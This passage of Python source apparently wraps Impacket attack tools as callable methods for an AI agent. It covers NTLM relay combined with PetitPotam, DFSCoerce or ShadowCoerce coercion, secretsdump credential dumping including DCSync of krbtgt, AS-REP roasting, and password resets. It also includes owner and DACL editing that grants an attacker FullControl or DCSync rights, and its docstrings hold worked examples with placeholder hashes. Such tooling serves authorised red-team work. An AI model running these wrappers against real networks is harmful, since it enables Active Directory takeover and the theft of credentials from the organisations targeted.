                                .ps1,.bat,.xml,.txt,.pfx
        --sccm-dp-files SCCM_DP_FILES
                                The path to a file containing a list of specific URLs to download from the Distribution Point, instead of downloading by
                                extensions. Providing this argument will skip file indexing
        </documentation>

        Args:
            target: Single target to relay to (IP, hostname, or URL).
            targets_file: File containing targets (one per line).
            smb2support: Enable SMB2 support.
            socks: Launch SOCKS proxy for relayed connections.
            interface_ip: IP address to bind SMB/HTTP servers to.
            smb_port: Port for SMB server.
            http_port: Port(s) for HTTP server (can be comma/range: "80,8000-8010").
            exec_command: Command to execute on target (SMB/RPC).
            interactive: Launch interactive shell instead of executing command.
            lootdir: Directory to store gathered loot (default: current).
            output_file: Base filename for encrypted hashes output.
            dump_hashes: Show encrypted hashes in console.
            escalate_user: LDAP - Escalate privileges of this user.
            delegate_access: LDAP - Delegate access on relayed computer account.
            dump_laps: LDAP - Attempt to dump LAPS passwords.
            dump_gmsa: LDAP - Attempt to dump gMSA passwords.
            dump_adcs: LDAP - Attempt to dump ADCS info.
            add_computer: SMB/LDAP - Add computer account (format: "NAME PASSWORD").
            no_dump: LDAP - Do not attempt to dump LDAP information.
            no_da: LDAP - Do not attempt to add Domain Admin.
            no_acl: LDAP - Disable ACL attacks.
            adcs: Enable AD CS relay attack.
            template: AD CS template name.
            altname: Subject Alternative Name for ESC1/ESC6 attacks.
            shadow_credentials: Enable Shadow Credentials relay attack.
            shadow_target: Target account for Shadow Credentials.
            remove_mic: Remove MIC (exploit CVE-2019-1040).
            no_smb_server: Disable SMB server.
            no_http_server: Disable HTTP server.
            no_wcf_server: Disable WCF server.
            no_raw_server: Disable RAW server.
            env: Optional environment variables.
            input: Optional input string to pass to the command's stdin.
        """
        if not target and not targets_file:
            raise ValueError("Must provide either target or targets_file")

        args = self._build_ntlmrelayx_args(
            target=target,
            targets_file=targets_file,
            smb2support=smb2support,
            socks=socks,
            interface_ip=interface_ip,
            smb_port=smb_port,
            http_port=http_port,
            exec_command=exec_command,
            interactive=interactive,
            lootdir=lootdir,
            output_file=output_file,
            dump_hashes=dump_hashes,
            escalate_user=escalate_user,
            delegate_access=delegate_access,
            dump_laps=dump_laps,
            dump_gmsa=dump_gmsa,
            dump_adcs=dump_adcs,
            add_computer=add_computer,
            no_dump=no_dump,
            no_da=no_da,
            no_acl=no_acl,
            adcs=adcs,
            template=template,
            altname=altname,
            shadow_credentials=shadow_credentials,
            shadow_target=shadow_target,
            remove_mic=remove_mic,
            no_smb_server=no_smb_server,
            no_http_server=no_http_server,
            no_wcf_server=no_wcf_server,
            no_raw_server=no_raw_server,
        )

        return await execute(
            self._build_script_command("ntlmrelayx.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_ntlmrelay_attack(
        self,
        *,
        # Relay target
        target: str,
        # Relay config
        interface_ip: str,
        smb2support: bool = True,
        adcs: bool = False,
        template: str | None = None,
        # Other relay actions
        dump_hashes: bool = False,
        delegate_access: bool = False,
        shadow_credentials: bool = False,
        shadow_target: str | None = None,
        exec_command: str | None = None,
        escalate_user: str | None = None,
        add_computer: str | None = None,
        # Server toggles
        no_smb_server: bool = False,
        no_http_server: bool = False,
        no_wcf_server: bool = False,
        no_raw_server: bool = False,
        # Coercion config
        coerce_method: str = "petitpotam",
        coerce_target: str,
        coerce_username: str | None = None,
        coerce_password: str | None = None,
        coerce_domain: str | None = None,
        coerce_hashes: str | None = None,
        coerce_dc_ip: str | None = None,
        coerce_pipe: str | None = None,
        # Timing
        relay_timeout: int = 120,
        env: dict[str, str] | None = None,
    ) -> str:
        """
        Combined NTLM relay + coercion attack in a single tool call.

        Starts ntlmrelayx as a relay server, waits for it to be ready, then
        fires a coercion attack (PetitPotam, DFSCoerce, or ShadowCoerce)
        to force the target machine to authenticate to the relay. Monitors
        relay output for success indicators and returns the combined result.

        This solves the sequencing problem where ntlmrelayx must be running
        *before* coercion fires, which is impossible with sequential tool calls.

        Args:
            target: Relay destination (URL like "http://ca/certsrv/certfnsh.asp"
                or "smb://dc01").
            interface_ip: IP address to bind relay listeners on AND the address
                the coercion target will authenticate back to.
            smb2support: Enable SMB2 support (default True).
            adcs: Enable AD CS relay attack.
            template: AD CS certificate template (e.g. "DomainController").
            dump_hashes: Show encrypted hashes in console.
            delegate_access: LDAP delegate access on relayed computer account.
            shadow_credentials: Enable Shadow Credentials relay attack.
            shadow_target: Target account for Shadow Credentials.
            exec_command: Command to execute on target after relay (SMB/RPC).
            escalate_user: LDAP user to escalate privileges for.
            add_computer: Add computer account (format: "NAME PASSWORD").
            no_smb_server: Disable SMB listener.
            no_http_server: Disable HTTP listener.
            no_wcf_server: Disable WCF listener.
            no_raw_server: Disable RAW listener.
            coerce_method: Coercion protocol — "petitpotam", "dfscoerce",
                or "shadowcoerce" (default: "petitpotam").
            coerce_target: Machine to coerce authentication from (IP or hostname).
            coerce_username: Username for coercion authentication.
            coerce_password: Password for coercion authentication.
            coerce_domain: Domain for coercion authentication.
            coerce_hashes: NTLM hashes for coercion authentication.
            coerce_dc_ip: Domain controller IP for coercion.
            coerce_pipe: Named pipe for PetitPotam (e.g. "efsr", "lsarpc").
            relay_timeout: Total timeout in seconds (default 120).
            env: Optional environment variables for subprocesses.
        """
        # Build coercion command first — validates script exists before
        # starting the relay server
        coerce_cmd = self._build_coercion_command(
            coerce_method,
            interface_ip,
            coerce_target,
            username=coerce_username,
            password=coerce_password,
            domain=coerce_domain,
            hashes=coerce_hashes,
            dc_ip=coerce_dc_ip,
            pipe=coerce_pipe,
        )

        relay_args = self._build_ntlmrelayx_args(
            target=target,
            smb2support=smb2support,
            interface_ip=interface_ip,
            adcs=adcs,
            template=template,
            dump_hashes=dump_hashes,
            delegate_access=delegate_access,
            shadow_credentials=shadow_credentials,
            shadow_target=shadow_target,
            exec_command=exec_command,
            escalate_user=escalate_user,
            add_computer=add_computer,
            no_smb_server=no_smb_server,
            no_http_server=no_http_server,
            no_wcf_server=no_wcf_server,
            no_raw_server=no_raw_server,
        )
        relay_cmd = self._build_script_command("ntlmrelayx.py", relay_args)

        # Prepare environment
        process_env = os.environ.copy()
        if env:
            process_env.update(env)

        relay_proc = await asyncio.create_subprocess_exec(
            *relay_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            start_new_session=True,
            env=process_env,
        )

        relay_output: list[str] = []
        coerce_result = ""

        try:
            # Readiness gets at most half the total budget, capped at 30s
            ready_timeout = min(relay_timeout // 2, 30)

            # Wait for relay to bind its listeners
            ready = await _wait_for_relay_ready(
                relay_proc, relay_output, timeout=ready_timeout
            )
            if not ready:
                captured = "".join(relay_output)
                raise RuntimeError(
                    f"ntlmrelayx failed to start within {ready_timeout}s.\n\n"
                    f"Output:\n{captured}"
                )

            # Fire coercion — the target authenticates back to our relay
            logger.info(
                f"Relay ready. Running {coerce_method} coercion against {coerce_target}"
            )
            coerce_timeout = min(30, relay_timeout - ready_timeout)
            try:
                coerce_result = await execute(
                    coerce_cmd, timeout=coerce_timeout, env=env
                )
            except (RuntimeError, TimeoutError) as exc:
                coerce_result = f"[coercion error] {exc}"
                logger.warning(f"Coercion failed: {exc}")
                # Don't abort — relay may still capture auth from retries
                # or other sources

            # Monitor relay for success with whatever time remains
            remaining = max(relay_timeout - ready_timeout - coerce_timeout, 1)
            success = await _wait_for_relay_result(
                relay_proc, relay_output, timeout=remaining
            )

            # Assemble result
            full_relay = "".join(relay_output)
            parts = [f"=== ntlmrelayx output ===\n{full_relay}"]
            if coerce_result:
                parts.append(
                    f"\n=== {coerce_method} coercion output ===\n{coerce_result}"
                )
            if not success:
                parts.append(
                    "\n[!] No relay success indicator detected within timeout. "
                    "Check output above for partial results."
                )
            return "\n".join(parts)

        finally:
            await _kill_relay(relay_proc)

    @tool_method(catch=True)
    async def impacket_owneredit(
        self,
        *,
        action: str,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        target: str | None = None,
        target_sid: str | None = None,
        target_dn: str | None = None,
        new_owner: str | None = None,
        new_owner_sid: str | None = None,
        new_owner_dn: str | None = None,
        use_ldaps: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket owneredit.py to read/modify object owners.

        Modifies the owner attribute of Active Directory objects.

        Authentication:
            At least one of (password, hashes, kerberos) must be provided.
            Domain and username are required unless using Kerberos with KRB5CCNAME.

        Usage Examples:
            # Read current owner of target object
            await impacket_owneredit(
                action="read",
                target="victim",
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Set attacker as owner of target object
            await impacket_owneredit(
                action="write",
                target="victim",
                new_owner="attacker",
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Set owner using NTLM hash and distinguished names
            await impacket_owneredit(
                action="write",
                target_dn="CN=Victim,CN=Users,DC=corp,DC=local",
                new_owner_dn="CN=Attacker,CN=Users,DC=corp,DC=local",
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0"
            )

        <documentation>
        Python editor for a principal's DACL.

        positional arguments:
        identity              domain.local/username[:password]

        options:
        -h, --help            show this help message and exit
        -use-ldaps            Use LDAPS instead of LDAP
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON

        authentication & connection:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
        -dc-ip ip address     IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part
                                (FQDN) specified in the identity parameter

        owner:
        Object, controlled by the attacker, to set as owner of the target object

        -new-owner NAME       sAMAccountName
        -new-owner-sid SID    Security IDentifier
        -new-owner-dn DN      Distinguished Name

        target:
        Target object to edit the owner of

        -target NAME          sAMAccountName
        -target-sid SID       Security IDentifier
        -target-dn DN         Distinguished Name

        dacl editor:
        -action [{read,write}]
                                Action to operate on the owner attribute
        </documentation>

        Args:
            action: Action to perform - 'read' or 'write' (required).
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            target: Target object sAMAccountName.
            target_sid: Target object Security Identifier.
            target_dn: Target object Distinguished Name.
            new_owner: New owner sAMAccountName (required for write action).
            new_owner_sid: New owner Security Identifier.
            new_owner_dn: New owner Distinguished Name.
            use_ldaps: Use LDAPS instead of LDAP.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Validation
        if not (password or hashes or kerberos):
            raise ValueError(
                "Must provide at least one authentication method: password, hashes, or kerberos"
            )

        if not (target or target_sid or target_dn):
            raise ValueError(
                "Must provide at least one target identifier: target, target_sid, or target_dn"
            )

        if action == "write" and not (new_owner or new_owner_sid or new_owner_dn):
            raise ValueError("Must provide new owner when action='write'")

        # Build identity
        identity = self._build_basic_identity(
            domain=domain, username=username, password=password
        )
        if not identity and not kerberos:
            raise ValueError(
                "Must provide domain/username unless using Kerberos authentication"
            )

        # Build command
        args = []
        if identity:
            args.append(identity)

        args.extend(["-action", action])

        if target:
            args.extend(["-target", target])

        if target_sid:
            args.extend(["-target-sid", target_sid])

        if target_dn:
            args.extend(["-target-dn", target_dn])

        if new_owner:
            args.extend(["-new-owner", new_owner])

        if new_owner_sid:
            args.extend(["-new-owner-sid", new_owner_sid])

        if new_owner_dn:
            args.extend(["-new-owner-dn", new_owner_dn])

        if use_ldaps:
            args.append("-use-ldaps")

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip))

        return await execute(
            self._build_script_command("owneredit.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_secretsdump(
        self,
        target: str,
        *,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        just_dc: bool = False,
        just_dc_user: str | None = None,
        just_dc_ntlm: bool = False,
        ldap_filter: str | None = None,
        skip_user: str | None = None,
        pwd_last_set: bool = False,
        user_status: bool = False,
        history: bool = False,
        outputfile: str | None = None,
        use_vss: bool = False,
        exec_method: str | None = None,
        system: str | None = None,
        sam: str | None = None,
        security: str | None = None,
        ntds: str | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket secretsdump.py to dump credentials from remote systems.

        Performs various credential dumping techniques including DCSync, VSS, and local file parsing.

        Usage Examples:
            # Dump credentials using password authentication
            await impacket_secretsdump(
                target="dc01.corp.local",
                domain="corp.local",
                username="admin",
                password="Password123"
            )

            # Dump credentials using NTLM hash (pass-the-hash)
            await impacket_secretsdump(
                target="dc01.corp.local",
                domain="corp.local",
                username="administrator",
                hashes="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
            )

            # DCSync attack to dump specific user with Kerberos ticket
            await impacket_secretsdump(
                target="dc01.corp.local",
                domain="corp.local",
                username="admin",
                kerberos=True,
                just_dc_user="krbtgt",
                env={"KRB5CCNAME": "/tmp/admin.ccache"}
            )

        <documentation>
        Performs various techniques to dump secrets from the remote machine without executing any agent there.

        positional arguments:
        target                [[domain/]username[:password]@]<targetName or address> or LOCAL (if you want to parse local files)

        options:
        -h, --help            show this help message and exit
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        -system SYSTEM        SYSTEM hive to parse
        -bootkey BOOTKEY      bootkey for SYSTEM hive
        -security SECURITY    SECURITY hive to parse
        -sam SAM              SAM hive to parse
        -ntds NTDS            NTDS.DIT file to parse
        -resumefile RESUMEFILE
                                resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep
                                updating the session's state
        -skip-sam             Do NOT parse the SAM hive on remote system
        -skip-security        Do NOT parse the SECURITY hive on remote system
        -outputfile OUTPUTFILE
                                base output filename. Extensions will be added for sam, secrets, cached and ntds
        -use-vss              Use the NTDSUTIL VSS method instead of default DRSUAPI
        -rodcNo RODCNO        Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)
        -rodcKey RODCKEY      AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)
        -use-keylist          Use the Kerb-Key-List method instead of default DRSUAPI
        -exec-method [{smbexec,wmiexec,mmcexec}]
                                Remote exec method to use at target (only when using -use-vss). Default: smbexec
        -use-remoteSSMethod   Remotely create Shadow Snapshot via WMI and download SAM, SYSTEM and SECURITY from it, the parse locally
        -remoteSS-remote-volume REMOTESS_REMOTE_VOLUME
                                Remote Volume to perform the Shadow Snapshot and download SAM, SYSTEM and SECURITY
        -remoteSS-local-path REMOTESS_LOCAL_PATH
                                Path where download SAM, SYSTEM and SECURITY from Shadow Snapshot. It defaults to current path

        display options:
        -just-dc-user USERNAME
                                Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch
        -ldapfilter LDAPFILTER
                                Extract only NTDS.DIT data for specific users based on an LDAP filter. Only available for DRSUAPI approach. Implies also
                                -just-dc switch
        -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
        -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)
        -skip-user SKIP_USER  Do NOT extract NTDS.DIT data for the user specified. Can provide comma-separated list of users to skip, or text file with one
                                user per line
        -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data
        -user-status          Display whether or not the user is disabled
        -history              Dump password history, and LSA secrets OldVal

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
        -keytab KEYTAB        Read keys for SPN from keytab file

        connection:
        -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
        -target-ip ip address
                                IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the
                                NetBIOS name and you cannot resolve it
        </documentation>

        Args:
            target: Target hostname/IP or "LOCAL" for local file parsing (required).
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            target_ip: Target machine IP address override.
            just_dc: Extract only NTDS.DIT data (NTLM hashes and Kerberos keys).
            just_dc_user: Extract NTDS.DIT data for specific user only.
            just_dc_ntlm: Extract only NTDS.DIT data (NTLM hashes only).
            ldap_filter: LDAP filter to extract specific users from NTDS.DIT.
            skip_user: Skip specific user(s) - comma-separated or file path.
            pwd_last_set: Show pwdLastSet attribute for accounts.
            user_status: Display whether users are disabled.
            history: Dump password history and LSA secrets OldVal.
            outputfile: Base output filename (extensions added automatically).
            use_vss: Use NTDSUTIL VSS method instead of DRSUAPI.
            exec_method: Remote exec method for VSS (smbexec/wmiexec/mmcexec).
            system: Local SYSTEM hive file to parse.
            sam: Local SAM hive file to parse.
            security: Local SECURITY hive file to parse.
            ntds: Local NTDS.DIT file to parse.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Build identity with target
        identity = self._build_identity_with_target(
            target, domain=domain, username=username, password=password
        )

        # Build command
        args = [identity]

        # DCSync options
        if just_dc:
            args.append("-just-dc")

        if just_dc_user:
            args.extend(["-just-dc-user", just_dc_user])

        if just_dc_ntlm:
            args.append("-just-dc-ntlm")

        if ldap_filter:
            args.extend(["-ldapfilter", ldap_filter])

        if skip_user:
            args.extend(["-skip-user", skip_user])

        if pwd_last_set:
            args.append("-pwd-last-set")

        if user_status:
            args.append("-user-status")

        if history:
            args.append("-history")

        # Output options
        if outputfile:
            args.extend(["-outputfile", outputfile])

        # Extraction method options
        if use_vss:
            args.append("-use-vss")

        if exec_method:
            args.extend(["-exec-method", exec_method])

        # Local file parsing options
        if system:
            args.extend(["-system", system])

        if sam:
            args.extend(["-sam", sam])

        if security:
            args.extend(["-security", security])

        if ntds:
            args.extend(["-ntds", ntds])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, target_ip=target_ip))

        return await execute(
            self._build_script_command("secretsdump.py", args),
            timeout=self.timeout + 120,  # secretsdump can take longer
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_get_np_users(
        self,
        *,
        domain: str,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        request: bool = False,
        outputfile: str | None = None,
        format: str | None = None,
        usersfile: str | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket GetNPUsers.py to find users without Kerberos pre-authentication.

        Performs ASREProasting attack to retrieve crackable hashes from accounts with DONT_REQ_PREAUTH set.

        Usage Examples:
            # List users without Kerberos pre-authentication (unauthenticated)
            await impacket_get_np_users(
                domain="corp.local",
                dc_ip="10.0.0.1"
            )

            # ASREProast and save hashes to file
            await impacket_get_np_users(
                domain="corp.local",
                dc_ip="10.0.0.1",
                request=True,
                outputfile="asrep_hashes.txt"
            )

            # ASREProast with username list and authentication
            await impacket_get_np_users(
                domain="corp.local",
                username="user",
                password="Password123",
                usersfile="users.txt",
                request=True
            )

        <documentation>
        Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking, also known as asreproasting.

        positional arguments:
        domain/username       Domain/username to authenticate to the Domain Controller (DC). If not specified, the tool will attempt to
                              list and query all users without Kerberos pre-authentication required.

        options:
        -h, --help            show this help message and exit
        -request              Requests TGT for users and outputs them in JtR/hashcat format (default False)
        -outputfile OUTPUTFILE
                              Output filename to write creds for JtR/hashcat
        -format {hashcat,john}
                              format to save the TGTs (default is hashcat)
        -usersfile USERSFILE  File with user names to check, one per line
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON

        authentication:
        -hashes LMHASH:NTHASH
                              NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                              cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

        connection:
        -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
        </documentation>

        Args:
            domain: Domain name (required).
            username: Username for authentication (optional for anonymous queries).
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            request: Request TGT tickets and output in hashcat/JtR format.
            outputfile: Output filename for hashes.
            format: Output format - 'hashcat' or 'john' (default: hashcat).
            usersfile: File with one username per line to check.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Build domain-first identity
        identity = self._build_domain_first_identity(
            domain, username=username, password=password
        )

        # Build command
        args = [identity]

        if request:
            args.append("-request")

        if outputfile:
            args.extend(["-outputfile", outputfile])

        if format:
            args.extend(["-format", format])

        if usersfile:
            args.extend(["-usersfile", usersfile])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip))

        return await execute(
            self._build_script_command("GetNPUsers.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_changepasswd(
        self,
        target: str,
        *,
        newpass: str | None = None,
        newhashes: str | None = None,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        altuser: str | None = None,
        altpass: str | None = None,
        althash: str | None = None,
        protocol: str | None = None,
        reset: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket changepasswd.py to change or reset user passwords.

        Changes passwords using various protocols (SMB-SAMR, RPC-SAMR, kpasswd, LDAP).

        Usage Examples:
            # Change own password over SMB-SAMR
            await impacket_changepasswd(
                target="dc01.corp.local",
                domain="corp.local",
                username="user",
                password="OldPass123",
                newpass="NewPass456!"
            )

            # Reset target user password with admin privileges
            await impacket_changepasswd(
                target="dc01.corp.local",
                domain="corp.local",
                username="admin",
                password="Password123",
                altuser="victim",
                newpass="ResetPass789!",
                reset=True
            )

            # Change password using NTLM hash over kpasswd
            await impacket_changepasswd(
                target="dc01.corp.local",
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                newpass="NewPass123!",
                protocol="kpasswd"
            )

        <documentation>
        Change or reset passwords over different protocols.

        positional arguments:
        target                [[domain/]username[:password]@]<hostname or address>

        options:
        -h, --help            show this help message and exit
        -ts                   adds timestamp to every logging output
        -debug                turn DEBUG output ON

        New credentials for target:
        -newpass NEWPASS      new password
        -newhashes LMHASH:NTHASH
                                new NTLM hashes, format is NTHASH or LMHASH:NTHASH

        Authentication (target user whose password is changed):
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is NTHASH or LMHASH:NTHASH
        -no-pass              Don't ask for password (useful for Kerberos, -k)

        Authentication (optional, privileged user performing the change):
        -altuser ALTUSER      Alternative username
        -altpass ALTPASS      Alternative password
        -althash, -althashes ALTHASH
                                Alternative NT hash, format is NTHASH or LMHASH:NTHASH

        Method of operations:
        -protocol, -p {smb-samr,rpc-samr,kpasswd,ldap}
                                Protocol to use for password change/reset
        -reset, -admin        Try to reset the password with privileges (may bypass some password policies)

        Kerberos authentication:
        Applicable to the authenticating user (-altuser if defined, else target)

        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
        -dc-ip ip address     IP Address of the domain controller, for Kerberos. If omitted it will use the domain part (FQDN) specified in the target
                                parameter
        </documentation>

        Args:
            target: Target hostname/IP (required).
            newpass: New password to set.
            newhashes: New NTLM hashes in LMHASH:NTHASH format.
            domain: Domain name.
            username: Username for authentication (target user).
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            altuser: Alternative username (privileged user performing the change).
            altpass: Alternative password.
            althash: Alternative NTLM hashes in LMHASH:NTHASH format.
            protocol: Protocol to use - 'smb-samr', 'rpc-samr', 'kpasswd', or 'ldap'.
            reset: Try to reset password with privileges (may bypass policies).
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Validation
        if not newpass and not newhashes:
            raise ValueError("Must provide either newpass or newhashes")

        # Build identity with target
        identity = self._build_identity_with_target(
            target, domain=domain, username=username, password=password
        )

        # Build command
        args = [identity]

        if newpass:
            args.extend(["-newpass", newpass])

        if newhashes:
            args.extend(["-newhashes", newhashes])

        if altuser:
            args.extend(["-altuser", altuser])

        if altpass:
            args.extend(["-altpass", altpass])

        if althash:
            args.extend(["-althash", althash])

        if protocol:
            args.extend(["-protocol", protocol])

        if reset:
            args.append("-reset")

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip))

        return await execute(
            self._build_script_command("changepasswd.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_dacledit(
        self,
        *,
        action: str,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        principal: str | None = None,
        principal_sid: str | None = None,
        principal_dn: str | None = None,
        target: str | None = None,
        target_sid: str | None = None,
        target_dn: str | None = None,
        rights: str | None = None,
        rights_guid: str | None = None,
        ace_type: str | None = None,
        inheritance: bool = False,
        use_ldaps: bool = False,
        file: str | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket dacledit.py to read/modify object DACLs.

        Edits Discretionary Access Control Lists for Active Directory objects.

        Authentication:
            At least one of (password, hashes, kerberos) must be provided.
            Domain and username are required unless using Kerberos with KRB5CCNAME.

        Usage Examples:
            # Read DACL of target object
            await impacket_dacledit(
                action="read",
                target="victim",
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Grant FullControl to attacker on target
            await impacket_dacledit(
                action="write",
                principal="attacker",
                target="victim",
                rights="FullControl",
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Grant DCSync rights using NTLM hash
            await impacket_dacledit(
                action="write",
                principal="attacker",
                target_dn="DC=corp,DC=local",
                rights="DCSync",
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0"
            )

        <documentation>
        Python editor for a principal's DACL.

        positional arguments:
        identity              domain.local/username[:password]

        options:
        -h, --help            show this help message and exit
        -use-ldaps            Use LDAPS instead of LDAP
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON

        authentication & connection:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
        -dc-ip ip address     IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part
                                (FQDN) specified in the identity parameter

        principal:
        Object, controlled by the attacker, to reference in the ACE to create or to filter when printing a DACL

        -principal NAME       sAMAccountName
        -principal-sid SID    Security IDentifier
        -principal-dn DN      Distinguished Name

        target:
        Principal object to read/edit the DACL of

        -target NAME          sAMAccountName
        -target-sid SID       Security IDentifier
        -target-dn DN         Distinguished Name

        dacl editor:
        -action [{read,write,remove,backup,restore}]
                                Action to operate on the DACL
        -file FILENAME        Filename/path (optional for -action backup, required for -restore))
        -ace-type [{allowed,denied}]
                                The ACE Type (access allowed or denied) that must be added or removed (default: allowed)
        -rights [{FullControl,ResetPassword,WriteMembers,DCSync}]
                                Rights to write/remove in the target DACL (default: FullControl)
        -rights-guid RIGHTS_GUID
                                Manual GUID representing the right to write/remove
        -inheritance          Enable the inheritance in the ACE flag with CONTAINER_INHERIT_ACE and OBJECT_INHERIT_ACE. Useful when target is a Container
                                or an OU, ACE will be inherited by objects within the container/OU (except objects with adminCount=1)
        </documentation>

        Args:
